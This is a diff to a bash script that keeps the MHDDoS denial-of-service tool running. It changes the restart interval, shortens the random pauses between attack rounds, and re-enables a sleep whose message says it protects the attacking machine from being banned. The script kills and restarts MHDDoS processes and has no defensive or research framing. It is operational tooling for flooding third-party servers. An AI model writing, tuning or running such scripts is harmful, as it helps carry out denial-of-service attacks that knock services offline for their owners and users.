@@ -1,6 +1,6 @@
 #!/bin/bash
 
-restart_interval="60s"
+restart_interval="20m"
 
 ulimit -n 1048576
 # TO DELETE WHEN EVERYTHING WILL BE OKAY WITH ORIGINAL REPO
@@ -145,9 +145,9 @@ do
 	taskkill -f -im python3.10.exe
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 	
-   	no_ddos_sleep="$(shuf -i 2-6 -n 1)m"
+   	no_ddos_sleep="$(shuf -i 1-4 -n 1)m"
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m]\033[46mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
-	#sleep $no_ddos_sleep
+	sleep $no_ddos_sleep
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m]\033[42mRESTARTING\033[0m\n"
 	
 	# for docker
